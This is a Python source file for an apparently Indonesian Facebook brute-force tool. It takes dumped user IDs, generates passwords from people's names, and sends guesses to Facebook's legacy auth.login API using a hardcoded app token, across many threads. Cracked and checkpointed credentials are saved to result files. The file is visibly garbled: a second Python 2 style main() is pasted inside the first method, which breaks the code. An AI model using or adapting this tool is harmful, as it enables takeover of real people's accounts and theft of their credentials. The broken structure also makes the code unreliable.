#!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : brute.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import re, time, json, os
from threading import (Thread, Event)
from src.CLI import (prints, inputs, br, progressBar)
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class Brute:
    def __init__(self, store=None):
        self.store = store
        self.event = Event()
        self.proccess = None
        self.OK = []
        self.CP = []
        self.user = []
        self.filter = []
        self.loop = 0

    def reset(self):
        self.OK = []
        self.CP = []
        self.user = []
        self.filter = []
        self.loop = 0

    def animate(self):
        while self.event.is_set():
            for i in list('\ |/-•'):
                count = len(self.user)
                loop = int(self.loop)
                ok = len(self.OK)
                cp = len(self.CP)
                progress = (self.loop * 100) / count
                datetimes = datetime.now().strftime('%H:%M:%S')
                self.proccess = '{0:>4}!m![!b!{1}!m!]!ran! Cracking {2}/{3} OK:-!h!{4}!ran! CP:-!k!{5}!ran! {6} {7:.0f}% '.format(
                    (''), str(datetimes), str(loop), str(count),
                    str(ok), str(cp), str(i), (progress)
                )
                prints(self.proccess, with_flush=True)
                time.sleep(0.1)

    def run(self):
        self.event.set()
        th = Thread(target=self.animate)
        th.start()

    def main(self, threads=40):
        self.reset()
        prints('!m!NOTE : Anda harus ngedump ID terlebih dahulu sebelum menggunakan fitur ini!', blank_left=4)
        br(1)
        while len(self.user) == 0:
            id = inputs('!p!List ID (!b!dump/react.json!p!)  : !b!', blank_left=4)
            if os.path.exists(id) == False:
                br(1)
                prints('!m!Oops file \'%s\' tidak ditemukan...'%(id), blank_left=4)
                br(1)
                continue
            try:
                op = open(id, 'r', encoding='utf-8').read()
                op = json.loads(op)
                for ids in op['data']:
                    pw = self.store.generatePasswordFromName(ids['name'])
                    self.user.append({'id': ids['id'], 'pw': pw})
            except:
                br(1)
                prints('!m!Ada kesalahan mohon periksa file anda pastikan list ID diperoleh dari tool ini.', blank_left=4)
                br(1)
                continue
            br(1)
            customPW = []
            ask = inputs('!p!Apakah ingin menggunakan password manual? !m![!p!Y/t!m!] !p!: !b!', blank_left=4)
            if ask.lower() == 'y':
                br(1)
                prints('!m!Gunakan (,)(comma) untuk password selanjutnya contoh !k!sayang,doraemon,facebook,dll!p!', blank_left=4)
                br(1)
                while True:
                    customPW = inputs('!p!Set password : !b!', blank_left=4).split(',')
                    if len(customPW) == 0 or customPW[0].strip() == '':
                        br(1)
                        prints('!m!Mohon isi password yang valid...', blank_left=4)
                        br(1)
                        continue
                    break

        br(1)
        progressBar(text='loading...', max=35)
        th = Thread(target=self.crack, args=(threads, customPW))
        th.start()
        self.run()
        return self
        
        def main(self):
		while True:
			file = raw_input('\nList id (ex: dump/xxx.json): ')
			try:
				list = open(file, 'r').read()
				object = json.loads(list)
				break
			except IOError:
				print("\n\033[0;91mOops, file '%s' not Found!\033[0m"% file)
		self.target = []
		for user in object:
			try:
				obj = user['name'].split(' ')
				if len(obj) == 1:
					listpass = [
						obj[0]+'123', obj[0]+'1234',
						obj[0]+'12345',
					]
				elif len(obj) == 2:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
					]
				elif len(obj) == 3:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
						obj[2]+'123', obj[2]+'12345',
					]
				elif len(obj) == 4:
					listpass = [
						obj[0]+'123', obj[0]+'12345',
						obj[1]+'123', obj[1]+'12345',
						obj[2]+'123', obj[2]+'12345',
						obj[3]+'123', obj[3]+'12345',
					]
				else:
					listpass = [
						'sayang', 'doraemon',
						'bangsat', 'kontol'
					]
				self.target.append({'id': user['uid'], 'pw': listpass})
			except: pass
		if len(self.target) == 0:
			exit("\n\033[0;91m Oops, id not found in file '%s'\033[0m"% file)
		ask = raw_input('Use password defaults OR manual? [D/m]: ')
		if ask.lower() == 'm':
			while True:
				print('\n\033[0;92mSet password use (,) for new password, EX: sayang,doraemon,bangsat\n\033[0m')
				self.setpw = raw_input('Set password: ').strip().split(',')
				if self.setpw[0] != '':
					break
				
		th(30).map(self.brute, self.target)
		self.results()
		exit()

	def results(self):
		if (len(self.ok) != 0):
			print('\n\nOK: '+str(len(self.ok)))
			for i in self.ok: print('\033[0;92m### ' +str(i)+'\033[0m')
			print('Your OK results saved in: out/ok.txt')
		if (len(self.cp) != 0):
			print('\n\nCP: '+str(len(self.cp)))
			for i in self.cp: print('\033[0;93m### '+str(i)+'\033[0m')
			print('Your CP results saved in: out/cp.txt')
		if (len(self.cp) == 0 and len(self.ok) == 0):
			print('\n\n033[0;91mNo results found :(\033[0m')


    def crack(self, thread=0, customPW=[]):
        with ThreadPoolExecutor(max_workers=35) as TH:
            for user in self.user:
                if len(customPW) == 0:
                    TH.submit(self.bruteAccount, (user['id']), (user['pw']))
                else:
                    TH.submit(self.bruteAccount, (user['id']), (customPW))

        self.event.clear()
        self.save()
        return self.store.instance.back()

    def save(self):
        time.sleep(2)
        datetimes = self.store.getDateTime()
        if os.path.exists('result/OK.json') == False:
            save = open('result/OK.json', 'w', encoding='utf-8')
            save.write(json.dumps({'data': []}))
            save.close()
        if os.path.exists('result/CP.json') == False:
            save = open('result/CP.json', 'w', encoding='utf-8')
            save.write(json.dumps({'data': []}))
            save.close()
        if len(self.OK) != 0:
            oldDataOK = open('result/OK.json', 'r', encoding='utf-8').read()
            oldDataOK = json.loads(oldDataOK)
            oldDataOK['data'].append({
                'created_at': datetimes,
                'total': len(self.OK),
                'list': self.OK
            })
            save = open('result/OK.json', 'w', encoding='utf-8')
            save.write(json.dumps(oldDataOK))
            save.close()
            br(2)
            prints('!p!OK : !h!%s'%(len(self.OK)), blank_left=4)
            for i in self.OK:
                prints('!m!- !h!%s'%(i), blank_left=6)
        if len(self.CP) != 0:
            oldDataCP = open('result/CP.json', 'r', encoding='utf-8').read()
            oldDataCP = json.loads(oldDataCP)
            oldDataCP['data'].append({
                'created_at': datetimes,
                'total': len(self.CP),
                'list': self.CP
            })
            save = open('result/CP.json', 'w', encoding='utf-8')
            save.write(json.dumps(oldDataCP))
            save.close()
            br(2)
            prints('!p!CP : !k!%s'%(len(self.CP)), blank_left=4)
            for i in self.CP:
                prints('!m!- !k!%s'%(i), blank_left=6)
        if len(self.OK) == 0 and len(self.CP) == 0:
            br(2)
            prints('!m!Tidak ada hasil :(', blank_left=4)
        br(1)

    def bruteAccount(self, id, pw):
        for passw in pw:
            params = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'JSON',
                'sdk_version': '2',
                'email': id,
                'locale': 'vi_VN',
                'password': passw,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
            }
            response = self.store.http.get('https://b-api.facebook.com/method/auth.login', base_url=False, with_credentials=False, data=params).text()
            if id not in self.filter:
                self.loop+=1
                self.filter.append(id)
            if re.search('(EAAA)\w+', str(response)):
                prints('\r    !m![!h!OK!m!]!h! %s -> %s'%(id, passw), blank_right=20)
                self.OK.append('%s -> %s'%(id, passw))
                break
            elif 'www.facebook.com' in str(response):
                prints('\r    !m![!k!CP!m!]!k! %s -> %s'%(id, passw), blank_right=20)
                self.CP.append('%s -> %s'%(id, passw))
                break